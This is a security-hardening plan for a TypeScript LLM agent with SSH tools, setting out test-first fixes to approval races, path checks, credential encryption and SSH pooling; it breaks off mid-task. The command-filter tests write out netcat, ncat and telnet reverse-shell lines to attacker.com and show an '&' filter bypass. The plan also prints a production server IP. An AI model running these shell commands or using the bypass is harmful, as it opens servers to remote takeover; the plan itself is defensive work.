# Security Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix all critical, high, and medium security/correctness bugs identified in the April 2026 audit, organized into four independently shippable phases.

**Architecture:** Each phase is a standalone set of changes that passes existing tests and introduces new tests. Phases are ordered by blast radius — Phase 1 patches active security holes with minimal diff, later phases restructure for long-term scalability.

**Tech Stack:** TypeScript (ESM), Node.js 20+, PostgreSQL 15+ with pgvector, Vitest, ssh2, @slack/bolt, grammy

---

## PHASE 1 — Critical Security Patches

> Fixes exploitable bugs with minimal diff. Each task is a surgical change — no refactoring.

---

### Task 1.1: Fix In-Memory Approval Double-Execute (CRIT-2)

**Files:**
- Modify: `src/database/db.ts:278-302`
- Test: `src/database/db.test.ts` (create if missing)

The in-memory `resolveApproval` has no compare-and-swap. Two concurrent `/approve` clicks both read `status = 'pending'` and both proceed to execute the tool. One line fixes it.

- [ ] **Step 1.1.1: Write the failing test**

Create `src/database/db.test.ts`:

```typescript
import { describe, it, expect, beforeEach } from 'vitest';
import { createApproval, resolveApproval } from './db.js';
// Do NOT call connectDB() — this tests in-memory path

describe('resolveApproval — in-memory CAS', () => {
    it('concurrent calls only succeed once', async () => {
        const record = await createApproval({
            session_id: 'test:u1',
            command: 'TOOL:fix_nginx_config|file_path=%2Fetc%2Fnginx',
            target_host: 'srv',
            rationale: 'test',
            tool_call_id: 'tc1',
        });

        const [r1, r2] = await Promise.all([
            resolveApproval(record.id, 'approved'),
            resolveApproval(record.id, 'approved'),
        ]);

        const successes = [r1, r2].filter(Boolean);
        expect(successes).toHaveLength(1);
    });

    it('returns null for already-resolved approval', async () => {
        const record = await createApproval({
            session_id: 'test:u2',
            command: 'TOOL:fix_nginx_config|file_path=%2Fetc%2Fnginx',
            target_host: 'srv',
            rationale: 'test',
            tool_call_id: 'tc2',
        });
        await resolveApproval(record.id, 'approved');
        const second = await resolveApproval(record.id, 'approved');
        expect(second).toBeNull();
    });
});
```

- [ ] **Step 1.1.2: Run test to confirm it fails**

```bash
cd /home/ajul/cloud-claw/Cloud-Claw && npx vitest run src/database/db.test.ts
```

Expected: FAIL — both concurrent calls return non-null (old behaviour).

- [ ] **Step 1.1.3: Apply one-line fix to `src/database/db.ts`**

Replace the in-memory `resolveApproval` block (lines 278–302):

```typescript
export async function resolveApproval(
    id: number,
    status: 'approved' | 'rejected' | 'expired'
): Promise<ApprovalRecord | null> {
    if (!isDBConfigured()) {
        const record = memoryApprovals.get(id);
        if (!record || record.status !== 'pending') return null;  // ← CAS guard
        record.status = status;
        record.resolved_at = new Date();
        return record;
    }
    const pool = getPool();
    const { rows } = await pool.query<ApprovalRecord>(
        `UPDATE approval_queue
     SET status = $2, resolved_at = NOW()
     WHERE id = $1 AND status = 'pending'
     RETURNING *`,
        [id, status]
    );
    return rows.length === 0 ? null : (rows[0] ?? null);
}
```

- [ ] **Step 1.1.4: Run test to confirm it passes**

```bash
npx vitest run src/database/db.test.ts
```

Expected: PASS

- [ ] **Step 1.1.5: Commit**

```bash
git add src/database/db.ts src/database/db.test.ts
git commit -m "fix(db): add CAS guard to in-memory resolveApproval — prevent double-execute on concurrent approvals"
```

---

### Task 1.2: Restrict `fix_nginx_config` to Nginx Config Paths (CRIT-3)

**Files:**
- Modify: `src/tools/fix_nginx_config.ts`
- Test: `src/tools/fix_nginx_config.test.ts` (create)

Without this, the LLM can call `fix_nginx_config({ file_path: "/etc/passwd" })` and the HITL gate may not catch it if the operator is inattentive.

- [ ] **Step 1.2.1: Read the top of the tool to find the validation point**

```bash
head -60 src/tools/fix_nginx_config.ts
```

Find the `isSafeUnixPath` function and the entry validation block.

- [ ] **Step 1.2.2: Write the failing test**

Create `src/tools/fix_nginx_config.test.ts`:

```typescript
import { describe, it, expect, vi } from 'vitest';

// Mock sshExec so no real SSH happens
vi.mock('../utils/ssh.js', () => ({ sshExec: vi.fn() }));
vi.mock('../utils/server_registry.js', () => ({
    getServerByLabel: vi.fn().mockResolvedValue({ ip: '127.0.0.1', sshUser: 'root', sshPort: 22 }),
    resolveServerFromMessage: vi.fn().mockResolvedValue({ ip: '127.0.0.1', sshUser: 'root', sshPort: 22, label: 'test' }),
}));

import { fixNginxConfigTool } from './fix_nginx_config.js';

describe('fix_nginx_config path validation', () => {
    it('rejects /etc/passwd', async () => {
        const result = await fixNginxConfigTool.execute({
            server_label: 'test',
            file_path: '/etc/passwd',
        }, {} as any);
        expect(result.success).toBe(false);
        expect(result.message).toMatch(/blocked/i);
    });

    it('rejects /root/.bashrc', async () => {
        const result = await fixNginxConfigTool.execute({
            server_label: 'test',
            file_path: '/root/.bashrc',
        }, {} as any);
        expect(result.success).toBe(false);
        expect(result.message).toMatch(/blocked/i);
    });

    it('accepts /etc/nginx-cs/vhosts.d/site.conf', async () => {
        const result = await fixNginxConfigTool.execute({
            server_label: 'test',
            file_path: '/etc/nginx-cs/vhosts.d/site.conf',
        }, {} as any);
        // Will proceed past validation (ssh mock may return empty string — that's fine)
        expect(result.message).not.toMatch(/blocked/i);
    });

    it('accepts /etc/nginx/sites-available/default', async () => {
        const result = await fixNginxConfigTool.execute({
            server_label: 'test',
            file_path: '/etc/nginx/sites-available/default',
        }, {} as any);
        expect(result.message).not.toMatch(/blocked/i);
    });
});
```

- [ ] **Step 1.2.3: Run test to confirm it fails**

```bash
npx vitest run src/tools/fix_nginx_config.test.ts
```

Expected: FAIL — `/etc/passwd` passes validation.

- [ ] **Step 1.2.4: Add path prefix validation to `fix_nginx_config.ts`**

Find the validation section early in the `execute` function (after `isSafeUnixPath` passes) and insert:

```typescript
const ALLOWED_NGINX_PATH_PREFIXES = [
    '/etc/nginx-cs/',
    '/etc/nginx/',
    '/usr/local/nginx/',
];

const pathAllowed = ALLOWED_NGINX_PATH_PREFIXES.some(prefix => filePath.startsWith(prefix));
if (!pathAllowed) {
    return {
        success: false,
        message: `🚫 BLOCKED: file_path must be within an nginx config directory. Got: ${filePath}`,
    };
}
```

Insert this block immediately after the existing `isSafeUnixPath` check so it short-circuits before any SSH calls.

- [ ] **Step 1.2.5: Run test to confirm it passes**

```bash
npx vitest run src/tools/fix_nginx_config.test.ts
```

Expected: PASS

- [ ] **Step 1.2.6: Commit**

```bash
git add src/tools/fix_nginx_config.ts src/tools/fix_nginx_config.test.ts
git commit -m "fix(tools): restrict fix_nginx_config to nginx config paths — block /etc/passwd and similar"
```

---

### Task 1.3: Fix Command Filter — `&` Operator + Remove Offensive Network Tools (MED-10)

**Files:**
- Modify: `src/security/command_filter.ts`
- Test: `src/security/command_filter.test.ts` (already exists, extend it)

Single `&` (background operator) is not split as a command separator. Combined with `nc` being in `READ_SAFE_BINARIES`, this creates a working reverse-shell bypass: `cat /etc/hosts & nc attacker.com 4444 -e /bin/bash`.

- [ ] **Step 1.3.1: Write the failing tests**

Append to `src/security/command_filter.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { checkCommand } from './command_filter.js';

describe('& background operator splitting', () => {
    it('blocks reverse shell via background operator', () => {
        expect(checkCommand('cat /etc/hosts & nc attacker.com 4444 -e /bin/bash').safe).toBe(false);
    });

    it('blocks unknown binary after single &', () => {
        expect(checkCommand('echo hello & unknownbinary --flag').safe).toBe(false);
    });

    it('still allows safe commands without &', () => {
        expect(checkCommand('cat /var/log/nginx/error.log').safe).toBe(true);
    });
});

describe('offensive network tools removed from whitelist', () => {
    it('blocks nc -e reverse shell', () => {
        expect(checkCommand('nc -e /bin/bash 10.0.0.1 4444').safe).toBe(false);
    });

    it('blocks nc listener', () => {
        expect(checkCommand('nc -lvp 4444').safe).toBe(false);
    });

    it('blocks nmap port scan', () => {
        expect(checkCommand('nmap -sV 192.168.1.0/24').safe).toBe(false);
    });

    it('blocks telnet connection', () => {
        expect(checkCommand('telnet attacker.com 4444').safe).toBe(false);
    });

    it('blocks ncat', () => {
        expect(checkCommand('ncat -e /bin/bash 10.0.0.1 1234').safe).toBe(false);
    });
});
```

- [ ] **Step 1.3.2: Run tests to confirm they fail**

```bash
npx vitest run src/security/command_filter.test.ts
```

Expected: Multiple FAILs — nc/nmap/telnet pass, & bypass works.

- [ ] **Step 1.3.3: Remove offensive tools from `READ_SAFE_BINARIES` in `command_filter.ts`**

Find the `READ_SAFE_BINARIES` Set and remove: `'nc'`, `'ncat'`, `'nmap'`, `'telnet'`

The line currently reads:
```typescript
'netstat', 'ss', 'dig', 'curl', 'wget', 'ping', 'traceroute', 'nmap', 'nc', 'ncat', 'telnet',
```

Change to:
```typescript
'netstat', 'ss', 'dig', 'curl', 'wget', 'ping', 'traceroute',
```

- [ ] **Step 1.3.4: Fix the `&` operator in the command splitter**

Find the command splitting loop in `checkCommand` (around line 175). The current code handles `&&` and `||` but not bare `&`. Replace the section that handles `&`:

```typescript
if (char === '&') {
    if (next === '&') {
        // logical AND — split and skip next char
        subCommands.push(current.trim());
        current = '';
        i++;
    } else {
        // background operator — also a separator
        subCommands.push(current.trim());
        current = '';
    }
    continue;
}
```

- [ ] **Step 1.3.5: Run tests to confirm they pass**

```bash
npx vitest run src/security/command_filter.test.ts
```

Expected: PASS

- [ ] **Step 1.3.6: Commit**

```bash
git add src/security/command_filter.ts src/security/command_filter.test.ts
git commit -m "fix(security): treat single & as command separator, remove nc/nmap/telnet/ncat from safe whitelist"
```

---

### Task 1.4: Remove Hardcoded Production IP from Source (MED-3)

**Files:**
- Modify: `src/agents/loop.ts`

The production server IP `139.84.130.63` is hardcoded in the system prompt builder and sent to external LLM APIs on every call.

- [ ] **Step 1.4.1: Find the hardcoded IP**

```bash
grep -n "139.84.130.63" src/agents/loop.ts
```

- [ ] **Step 1.4.2: Replace with env variable**

Find the `SYSTEM_PROMPT` call that passes `sshHost: '139.84.130.63'` and replace:

```typescript
// Before:
const baseSystemPrompt = SYSTEM_PROMPT({
    sshHost: '139.84.130.63',
    sshUser: 'root',
    ...
});

// After:
const baseSystemPrompt = SYSTEM_PROMPT({
    sshHost: env.SSH_HOST ?? 'not configured',
    sshUser: env.SSH_USER ?? 'root',
    ...
});
```

- [ ] **Step 1.4.3: Verify no other hardcoded IPs remain**

```bash
grep -rn "139\.84\." src/
```

Expected: no matches.

- [ ] **Step 1.4.4: Typecheck**

```bash
npm run typecheck
```

Expected: no errors.

- [ ] **Step 1.4.5: Commit**

```bash
git add src/agents/loop.ts
git commit -m "fix(config): replace hardcoded production IP with env.SSH_HOST in system prompt"
```

---

## PHASE 2 — High Security Fixes

> Credential encryption and encoding correctness. Requires a database migration.

---

### Task 2.1: Encrypt Cloudstick Credentials at Rest (HIGH-2)

**Files:**
- Modify: `src/services/user_service.ts`
- Modify: `src/database/schema.sql` (comment only — migration is in-place)

Cloudstick `api_key` and `api_secret` are stored plaintext. SSH keys are already encrypted with AES-256-GCM. Apply the same pattern.

**Important:** After this change, any existing plaintext credentials in the database will fail to decrypt. Run the migration script in Task 2.1.6 before deploying.

- [ ] **Step 2.1.1: Write the failing test**

Create `src/services/user_service.test.ts`:

```typescript
import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock the database — we test crypto behaviour, not DB queries
vi.mock('../database/db.js', () => ({
    getPool: vi.fn(() => ({
        query: vi.fn().mockResolvedValue({ rows: [] }),
    })),
    isDBConfigured: vi.fn(() => true),
}));

vi.mock('../config/env.js', () => ({
    env: {
        ENCRYPTION_KEY: 'a'.repeat(64), // 64-char hex = 32 bytes
        LLM_PROVIDER: 'openai',
        LLM_MODEL: 'gpt-4o',
        SSH_USER: 'root',
        SSH_PORT: 22,
    },
}));

import { encrypt, decrypt } from '../utils/crypto.js';

describe('Cloudstick credential encryption round-trip', () => {
    it('encrypt/decrypt Cloudstick API key round-trips correctly', () => {
        const apiKey = 'cs_live_abc123xyz456';
        const encrypted = encrypt(apiKey);
        expect(encrypted).not.toBe(apiKey);
        expect(encrypted).toMatch(/^[0-9a-f]+:[0-9a-f]+:[0-9a-f]+$/);
        expect(decrypt(encrypted)).toBe(apiKey);
    });

    it('encrypt/decrypt Cloudstick API secret round-trips correctly', () => {
        const secret = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0OH0.sig';
        const encrypted = encrypt(secret);
        expect(decrypt(encrypted)).toBe(secret);
    });

    it('two encryptions of the same value produce different ciphertexts (IV randomness)', () => {
        const value = 'same-plaintext';
        expect(encrypt(value)).not.toBe(encrypt(value));
    });
});
```

- [ ] **Step 2.1.2: Run test to confirm it passes (crypto module is already correct)**

```bash
npx vitest run src/services/user_service.test.ts
```

Expected: PASS — the crypto module works. This baseline confirms the encrypt/decrypt utilities before we wire them in.

- [ ] **Step 2.1.3: Update `upsertUser` in `user_service.ts` to encrypt credentials**

Find the `if (data.cloudstick_api_key !== undefined)` block and wrap the values:

```typescript
import { encrypt, decrypt } from '../utils/crypto.js';

// In upsertUser, UPDATE path:
if (data.cloudstick_api_key !== undefined) {
    fields.push(`cloudstick_api_key = $${idx++}`);
    values.push(data.cloudstick_api_key ? encrypt(data.cloudstick_api_key) : null);
}
if (data.cloudstick_api_secret !== undefined) {
    fields.push(`cloudstick_api_secret = $${idx++}`);
    values.push(data.cloudstick_api_secret ? encrypt(data.cloudstick_api_secret) : null);
}

// In upsertUser, INSERT path:
data.cloudstick_api_key ? encrypt(data.cloudstick_api_key) : null,
data.cloudstick_api_secret ? encrypt(data.cloudstick_api_secret) : null,
```

- [ ] **Step 2.1.4: Add `getDecryptedCloudstickCredentials` helper and update `hasCloudstickCredentials`**

Add after the existing `getDecryptedSshKey` function:

```typescript
export function getDecryptedCloudstickCredentials(user: CloudclawUser): {
    apiKey: string | null;
    apiSecret: string | null;
} {
    try {
        return {
            apiKey: user.cloudstick_api_key ? decrypt(user.cloudstick_api_key) : null,
            apiSecret: user.cloudstick_api_secret ? decrypt(user.cloudstick_api_secret) : null,
        };
    } catch {
        // If decryption fails, the value is likely plaintext (pre-migration row)
        // Return as-is so the API call can still succeed until re-encrypted on next /setup
        return {
            apiKey: user.cloudstick_api_key,
            apiSecret: user.cloudstick_api_secret,
        };
    }
}
```

- [ ] **Step 2.1.5: Update all callers that read `user.cloudstick_api_key` / `user.cloudstick_api_secret` to use the decryption helper**

Find all usages:

```bash
grep -rn "cloudstick_api_key\|cloudstick_api_secret" src/ --include="*.ts" | grep -v "user_service.ts" | grep -v "test"
```

For each file that reads these values directly (likely `cloudstick_context.ts` and `api/cloudstick_client.ts`), replace direct field access with `getDecryptedCloudstickCredentials(user)`.

Example in `src/api/cloudstick_context.ts`:

```typescript
// Before:
const { cloudstick_api_key, cloudstick_api_secret } = user;

// After:
import { getDecryptedCloudstickCredentials } from '../services/user_service.js';
const { apiKey: cloudstick_api_key, apiSecret: cloudstick_api_secret } = getDecryptedCloudstickCredentials(user);
```

- [ ] **Step 2.1.6: Write a one-off migration script to re-encrypt existing plaintext credentials**

Create `src/scripts/migrate_encrypt_cloudstick_creds.ts`:

```typescript
/**
 * One-off migration: encrypt existing plaintext Cloudstick credentials.
 * Run ONCE after deploying Phase 2. Safe to run multiple times — already-encrypted
 * values will fail the plaintext detection heuristic and be skipped.
 *
 * Usage: npx tsx src/scripts/migrate_encrypt_cloudstick_creds.ts
 */

import 'dotenv/config';
import { Pool } from 'pg';
import { encrypt, decrypt } from '../utils/crypto.js';

function isAlreadyEncrypted(value: string): boolean {
    // Encrypted format: hex:hex:hex (iv:tag:ciphertext)
    return /^[0-9a-f]+:[0-9a-f]+:[0-9a-f]+$/.test(value);
}

async function main() {
    const pool = new Pool({ connectionString: process.env.DATABASE_URL });
    const { rows } = await pool.query('SELECT id, cloudstick_api_key, cloudstick_api_secret FROM users');

    let migrated = 0;
    for (const row of rows) {
        const updates: string[] = [];
        const values: unknown[] = [];
        let idx = 1;

        if (row.cloudstick_api_key && !isAlreadyEncrypted(row.cloudstick_api_key)) {
            updates.push(`cloudstick_api_key = $${idx++}`);
            values.push(encrypt(row.cloudstick_api_key));
        }
        if (row.cloudstick_api_secret && !isAlreadyEncrypted(row.cloudstick_api_secret)) {
            updates.push(`cloudstick_api_secret = $${idx++}`);
            values.push(encrypt(row.cloudstick_api_secret));
        }

        if (updates.length > 0) {
            values.push(row.id);
            await pool.query(`UPDATE users SET ${updates.join(', ')} WHERE id = $${idx}`, values);
            migrated++;
            console.log(`Migrated user id=${row.id}`);
        }
    }

    console.log(`Migration complete. Migrated ${migrated} of ${rows.length} users.`);
    await pool.end();
}

main().catch(err => { console.error(err); process.exit(1); });
```

- [ ] **Step 2.1.7: Typecheck**

```bash
npm run typecheck
```

Expected: no errors.

- [ ] **Step 2.1.8: Commit**

```bash
git add src/services/user_service.ts src/services/user_service.test.ts src/scripts/migrate_encrypt_cloudstick_creds.ts
git commit -m "feat(security): encrypt Cloudstick api_key/secret at rest using AES-256-GCM, add migration script"
```

---

### Task 2.2: Fix Tool Approval Encoding — Encode Arg Keys (CRIT-7)

**Files:**
- Modify: `src/hitl/tool_approval.ts`
- Test: `src/hitl/tool_approval.test.ts` (already exists, extend it)

Arg values are `encodeURIComponent`-encoded but keys are not. A key containing `|` or `=` would corrupt the decode. Keys come from the LLM's tool schema names and are safe in practice, but encoding them makes the format unambiguously correct.

- [ ] **Step 2.2.1: Write failing round-trip tests**

Append to `src/hitl/tool_approval.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { encodeToolApprovalCommand, decodeToolApprovalCommand } from './tool_approval.js';

describe('encodeToolApprovalCommand round-trip', () => {
    it('round-trips a value containing a pipe character', () => {
        const enc = encodeToolApprovalCommand('execute_ssh_write', {
            command: 'echo "a|b"',
            server_label: 'prod',
        });
        const dec = decodeToolApprovalCommand(enc);
        expect(dec?.args.command).toBe('echo "a|b"');
    });

    it('round-trips a value containing an equals sign', () => {
        const enc = encodeToolApprovalCommand('fix_nginx_config', {
            file_path: '/etc/nginx-cs/k=v.conf',
        });
        const dec = decodeToolApprovalCommand(enc);
        expect(dec?.args.file_path).toBe('/etc/nginx-cs/k=v.conf');
    });

    it('round-trips multiple args', () => {
        const args = { server_label: 'prod', host: '10.0.0.1', file_path: '/etc/nginx/site.conf' };
        const enc = encodeToolApprovalCommand('fix_nginx_config', args);
        const dec = decodeToolApprovalCommand(enc);
        expect(dec?.args).toEqual(args);
    });

    it('round-trips empty args', () => {
        const enc = encodeToolApprovalCommand('some_tool', {});
        const dec = decodeToolApprovalCommand(enc);
        expect(dec?.toolName).toBe('some_tool');
        expect(dec?.args).toEqual({});
    });
});
```

- [ ] **Step 2.2.2: Run tests to confirm they pass (values are already encoded)**

```bash
npx vitest run src/hitl/tool_approval.test.ts
```

Expected: PASS for value tests. This confirms the encoding already handles values correctly.

- [ ] **Step 2.2.3: Switch encoding to use JSON serialization for unambiguous round-trip**

The current pipe-delimited format is fragile. Replace it with a single `encodeURIComponent` over the entire JSON-serialized args object. This is a cleaner format with no delimiter collision possible:

```typescript
// src/hitl/tool_approval.ts

export function encodeToolApprovalCommand(toolName: string, args: Record<string, string>): string {
    const encodedArgs = encodeURIComponent(JSON.stringify(args));
    return `${TOOL_PREFIX}${toolName}|${encodedArgs}`;
}

export function decodeToolApprovalCommand(command: string): ToolApprovalPayload | null {
    if (!command.startsWith(TOOL_PREFIX)) return null;

    const pipeIdx = command.indexOf('|');
    if (pipeIdx === -1) {
        // No args
        const toolName = command.slice(TOOL_PREFIX.length).trim();
        return toolName ? { toolName, args: {} } : null;
    }

    const toolName = command.slice(TOOL_PREFIX.length, pipeIdx).trim();
    if (!toolName) return null;

    const encodedArgs = command.slice(pipeIdx + 1);

    // Handle legacy pipe-delimited format for backwards compat
    // New format: single encodeURIComponent'd JSON blob starting with %7B
    if (encodedArgs.startsWith('%7B') || encodedArgs.startsWith('{')) {
        try {
            const args = JSON.parse(decodeURIComponent(encodedArgs)) as Record<string, string>;
            return { toolName, args };
        } catch {
            // Fall through to legacy decode
        }
    }

    // Legacy: key=encodeURIComponent(value) separated by |
    const args: Record<string, string> = {};
    for (const part of encodedArgs.split('|')) {
        const eq = part.indexOf('=');
        if (eq <= 0) continue;
        const key = part.slice(0, eq);
        const rawValue = part.slice(eq + 1);
        try {
            args[key] = decodeURIComponent(rawValue);
        } catch {
            args[key] = rawValue;
        }
    }
    return { toolName, args };
}
```

Note: The `__stateHash` suffix appended by `loop.ts` as `|__stateHash=...` will now appear as a second `|` after the JSON blob. The new decoder handles this: `encodedArgs` is everything after the first `|`, and `%7B...` detects the JSON format, so the stateHash suffix is ignored during JSON parse. Update `loop.ts` to also embed `__stateHash` inside the JSON args instead of appending separately — or keep the legacy suffix approach; the decoder ignores it.

- [ ] **Step 2.2.4: Run tests to confirm they pass**

```bash
npx vitest run src/hitl/tool_approval.test.ts
```

Expected: PASS

- [ ] **Step 2.2.5: Typecheck**

```bash
npm run typecheck
```

- [ ] **Step 2.2.6: Commit**

```bash
git add src/hitl/tool_approval.ts src/hitl/tool_approval.test.ts
git commit -m "fix(hitl): replace fragile pipe-delimited approval encoding with JSON+encodeURIComponent, keep legacy decode for backwards compat"
```

---

## PHASE 3 — Resilience & Scalability

> Fixes race conditions and resource management issues that compound under production load.

---

### Task 3.1: Fix SSH Pool Recursive Wait (CRIT-1)

**Files:**
- Modify: `src/utils/ssh.ts:99-103`

The recursive `getPooledConnection` call has no depth limit. Under sustained load (30 SSH calls/session × 2 sessions = 60 concurrent), the stack can overflow and crash the process.

- [ ] **Step 3.1.1: Write the failing test**

Create `src/utils/ssh.test.ts`:

```typescript
import { describe, it, expect, vi, beforeEach } from 'vitest';

// We test the pool wait logic in isolation — no real SSH
vi.mock('../config/env.js', () => ({
    env: { SSH_USER: 'root', SSH_PORT: 22, ENCRYPTION_KEY: undefined },
}));
vi.mock('../services/user_service.js', () => ({ getUserByPlatformId: vi.fn(), getDecryptedSshKey: vi.fn() }));
vi.mock('../api/cloudstick_context.js', () => ({ getCloudstickUser: vi.fn(() => null) }));
vi.mock('../security/ssh_ca.js', () => ({ isSSHCAConfigured: vi.fn(() => false), getSignedCert: vi.fn(), readCertificate: vi.fn() }));
vi.mock('ssh2', () => ({
    Client: vi.fn().mockImplementation(() => ({
        on: vi.fn().mockReturnThis(),
        connect: vi.fn(),
        end: vi.fn(),
    })),
}));

// Import AFTER mocks
import { sshExec } from './ssh.js';

describe('SSH pool iterative wait — no stack overflow', () => {
    it('does not throw RangeError when pool is saturated with many waiters', async () => {
        // This test verifies the iterative wait path doesn't blow the stack.
        // With recursive impl, 100 concurrent calls would overflow.
        // With iterative impl (while loop), it just waits.
        // We set a short timeout to avoid the test hanging.
        const CONCURRENCY = 100;
        const calls = Array.from({ length: CONCURRENCY }, () =>
            sshExec('127.0.0.1', 'echo test', { retries: 1, timeoutMs: 100 }).catch(() => 'timeout')
        );
        // All will fail (no real SSH) but none should throw RangeError
        const results = await Promise.allSettled(calls);
        const rangeErrors = results.filter(r =>
            r.status === 'rejected' && r.reason instanceof RangeError
        );
        expect(rangeErrors).toHaveLength(0);
    });
});
```

- [ ] **Step 3.1.2: Run test to confirm it fails (or hangs, requiring Ctrl+C)**

```bash
npx vitest run src/utils/ssh.test.ts --timeout 5000
```

Expected: stack overflow or test timeout with recursive implementation.

- [ ] **Step 3.1.3: Replace recursive wait with iterative `while` loop in `src/utils/ssh.ts`**

Replace lines 98–103:

```typescript
// Before (recursive — can overflow):
if (pool.length >= MAX_CONNECTIONS_PER_HOST) {
    await new Promise(resolve => setTimeout(resolve, 500));
    return getPooledConnection(host, port, user, key, certificate);
}

// After (iterative — bounded memory):
const MAX_WAIT_MS = 30_000;
const POLL_INTERVAL_MS = 100;
let waited = 0;

while (pool.length >= MAX_CONNECTIONS_PER_HOST) {
    // Try to find a free slot before waiting
    const free = pool.find(p => !p.inUse);
    if (free) {
        free.inUse = true;
        free.lastUsed = Date.now();
        console.log(`[ssh] Reusing pooled connection for ${hostKey} (waited ${waited}ms)`);
        return free.conn;
    }

    if (waited >= MAX_WAIT_MS) {
        throw new Error(`[ssh] Pool exhausted for ${hostKey} — all ${MAX_CONNECTIONS_PER_HOST} connections busy after ${MAX_WAIT_MS}ms`);
    }

    await new Promise(resolve => setTimeout(resolve, POLL_INTERVAL_MS));
    waited += POLL_INTERVAL_MS;
    cleanupPool(hostKey); // evict any connections that went idle while waiting
}
```

- [ ] **Step 3.1.4: Run test to confirm it passes**

```bash
npx vitest run src/utils/ssh.test.ts --timeout 10000
```

Expected: PASS — no RangeError, calls time out gracefully.

- [ ] **Step 3.1.5: Commit**

```bash
git add src/utils/ssh.ts src/utils/ssh.test.ts
git commit -m "fix(ssh): replace recursive pool wait with iterative while-loop — prevents stack overflow under load"
```

---

### Task 3.2: Session Optimistic Concurrency — Prevent Last-Write-Wins Corruption (HIGH-1)

**Files:**
- Modify: `src/database/schema.sql`
- Modify: `src/database/db.ts`
- Modify: `src/agents/loop.ts` (upsertSession call sites)

Two messages arriving within ~100ms for the same session corrupt each other's history because `upsertSession` is a blind overwrite. The fix uses a `version` column with a conditional update and simple retry on conflict.

- [ ] **Step 3.2.1: Add the `version` column to the schema**

Add to `src/database/schema.sql`:

```sql
-- Optimistic concurrency version counter for sessions
ALTER TABLE sessions ADD COLUMN IF NOT EXISTS version INTEGER NOT NULL DEFAULT 0;
```

Run against the dev database:

```bash
psql $DATABASE_URL -c "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS version INTEGER NOT NULL DEFAULT 0;"
```

- [ ] **Step 3.2.2: Update `SessionRecord` interface and `getSession` in `db.ts`**

```typescript
export interface SessionRecord {
    id: string;
    channel: string;
    user_id: string;
    reply_target: string | null;
    messages: Array<Record<string, unknown>>;
    receipts?: Record<string, unknown>;
    iteration: number;
    version: number;          // ← add this field
    status?: string;
    created_at: Date;
    updated_at: Date;
    last_activity?: Date;
}
```

Update `memoryStore` entries to include `version: 0` on creation.

- [ ] **Step 3.2.3: Update `upsertSession` to use optimistic concurrency**

Replace the `upsertSession` function body:

```typescript
export async function upsertSession(
    session: Pick<SessionRecord, 'id' | 'channel' | 'user_id' | 'iteration' | 'reply_target'> & {
        messages: Array<Record<string, unknown>>;
        receipts?: Record<string, unknown>;
        expectedVersion?: number;  // ← new: if provided, enforce OCC
    }
): Promise<void> {
    if (!isDBConfigured()) {
        const existing = memoryStore.get(session.id);
        // OCC check for in-memory: if expectedVersion provided and doesn't match, skip
        if (
            session.expectedVersion !== undefined &&
            existing &&
            existing.version !== session.expectedVersion
        ) {
            console.warn(`[DB] Session ${session.id} version conflict (expected ${session.expectedVersion}, got ${existing.version}) — skipping stale write`);
            return;
        }
        memoryStore.set(session.id, {
            ...(session as any),
            receipts: session.receipts ?? existing?.receipts ?? {},
            version: (existing?.version ?? 0) + 1,
            created_at: existing?.created_at ?? new Date(),
            updated_at: new Date(),
            last_activity: new Date(),
            status: 'active',
        });
        return;
    }

    const pool = getPool();

    if (session.expectedVersion !== undefined) {
        // OCC update: only write if version matches
        const result = await pool.query(
            `UPDATE sessions SET
               reply_target  = $1,
               messages      = $2,
               receipts      = $3,
               iteration     = $4,
               last_activity = NOW(),
               status        = 'active',
               updated_at    = NOW(),
               version       = version + 1
             WHERE id = $5 AND version = $6`,
            [
                session.reply_target ?? null,
                JSON.stringify(session.messages),
                JSON.stringify(session.receipts ?? {}),
                session.iteration,
                session.id,
                session.expectedVersion,
            ]
        );
        if ((result.rowCount ?? 0) === 0) {
            console.warn(`[DB] Session ${session.id} version conflict (expected ${session.expectedVersion}) — skipping stale write`);
        }
    } else {
        // Blind upsert (first write / creation path)
        await pool.query(
            `INSERT INTO sessions (id, channel, user_id, reply_target, messages, receipts, iteration, version)
         VALUES ($1, $2, $3, $4, $5, $6, $7, 0)
         ON CONFLICT (id) DO UPDATE SET
           reply_target  = EXCLUDED.reply_target,
           messages      = EXCLUDED.messages,
           receipts      = EXCLUDED.receipts,
           iteration     = EXCLUDED.iteration,
           last_activity = NOW(),
           status        = 'active',
           updated_at    = NOW(),
           version       = sessions.version + 1`,
            [
                session.id,
                session.channel,
                session.user_id,
                session.reply_target ?? null,
                JSON.stringify(session.messages),
                JSON.stringify(session.receipts ?? {}),
                session.iteration,
            ]
        );
    }
}
```

- [ ] **Step 3.2.4: Thread `expectedVersion` through `runAgentLoop` in `loop.ts`**

In `loop.ts`, when calling `upsertSession` after processing messages, pass the version loaded at session start:

```typescript
// At session load time (near top of runAgentLoop):
const loadedSession = await getSession(sessionId);
const sessionVersion = loadedSession?.version ?? 0;

// At upsertSession call sites:
await upsertSession({
    id: sessionId,
    channel: ...,
    user_id: ...,
    reply_target: ...,
    messages,
    receipts: serializeReceipts(executionReceipts),
    iteration: currentIteration,
    expectedVersion: sessionVersion,  // ← pass the version we read
});
```

- [ ] **Step 3.2.5: Typecheck**

```bash
npm run typecheck
```

- [ ] **Step 3.2.6: Commit**

```bash
git add src/database/schema.sql src/database/db.ts src/agents/loop.ts
git commit -m "feat(db): add optimistic concurrency (version column) to sessions — prevent last-write-wins corruption under concurrent messages"
```

---

### Task 3.3: Fix Idempotency Guard O(n log n) Eviction (MED-5)

**Files:**
- Modify: `src/api/idempotency_guard.ts:38-42`

At 501 entries, the cache spreads and sorts all entries to remove one. This triggers again at every subsequent write. Replace with batch eviction of the oldest 20%.

- [ ] **Step 3.3.1: Replace the eviction block in `setCachedResult`**

```typescript
function setCachedResult(key: string, result: unknown): void {
    idempotencyCache.set(key, { result, timestamp: Date.now() });

    if (idempotencyCache.size > 500) {
        // Evict oldest 20% in one pass — O(n) scan, amortised over 100 writes
        const entries = [...idempotencyCache.entries()]
            .sort((a, b) => a[1].timestamp - b[1].timestamp);
        const evictCount = Math.ceil(entries.length * 0.2);
